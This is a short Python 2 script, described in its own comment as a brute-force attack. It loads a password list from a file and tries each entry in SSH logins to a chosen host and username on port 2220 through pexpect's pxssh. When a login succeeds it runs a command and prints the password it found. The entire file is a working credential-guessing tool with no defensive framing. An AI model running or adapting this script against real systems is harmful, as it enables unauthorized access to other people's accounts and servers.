# Brute force attack with a list of passwords saved in a file.
import os
import sys

from pexpect import pxssh

fileName = sys.argv[1]
hostname = sys.argv[2]
username = sys.argv[3]

fileObj = open(fileName, "r+")
data = fileObj.readlines()
fileObj.close()

dataNew = []
for ele in data:
    tmp = ele.strip("\n")
    dataNew.append(tmp)

unique = list(set(dataNew))

for passwd in unique:
    try:
        s = pxssh.pxssh()
        password = passwd
        s.login(hostname, username, password, port="2220")
        s.sendline('uptime')   # run a command
        s.prompt()             # match the prompt
        print(s.before)        # print everything before the prompt.
        s.logout()
        print "#####################################"
        print "This is the password"
        print "passwd : ", str(passwd)
        print "#####################################"
    except pxssh.ExceptionPxssh as e:
        print("pxssh failed on login. Trying other password")
        print(e)
